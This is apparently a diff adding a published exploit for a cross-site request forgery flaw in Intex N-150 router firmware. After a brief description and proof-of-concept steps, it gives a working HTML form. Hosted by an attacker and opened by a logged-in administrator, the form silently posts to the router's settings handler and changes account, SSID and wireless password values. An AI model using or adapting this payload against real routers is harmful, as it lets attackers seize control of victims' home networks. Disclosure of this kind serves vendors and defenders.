@@ -1,0 +1,40 @@
+# Exploit Title:​​ Intex Router N-150 - Cross-Site Request Forgery (Add Admin)
+# Date: 2018-06-23
+# Exploit Author: Navina Asrani
+# Version: N-150
+# CVE : N/A
+# Category: Router Firmware
+
+# 1. Description
+# The firmware allows malicious request to be executed without verifying
+# source of request. This leads to arbitrary execution with malicious request
+# which will lead to the creation of a privileged user..
+
+# 2. Proof of Concept
+# Visit the application
+# Go to any router setting modification page and change the values,
+# create a request and observe the lack of CSRF tokens.
+# Craft an html page with all the details for the built-in admin
+# user creation and host it on a server
+# Upon the link being clicked by a logged in admin user,
+# immediately, the action will get executed
+# Exploitation Technique: A attacker can create a rogue admin user to gain
+# access to the application.
+
+# Exploit code:
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://192.168.0.1/goform/WizardHandle" method="POST">
+      <input type="hidden" name="GO" value="index&#46;asp" />
+      <input type="hidden" name="v12&#95;time" value="1529768448&#46;425" />
+      <input type="hidden" name="WANT1" value="3" />
+      <input type="hidden" name="isp" value="3" />
+      <input type="hidden" name="PUN" value="testuser&#95;k" />
+      <input type="hidden" name="PPW" value="123456" />
+      <input type="hidden" name="SSID" value="testwifiap" />
+      <input type="hidden" name="wirelesspassword" value="00000000" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
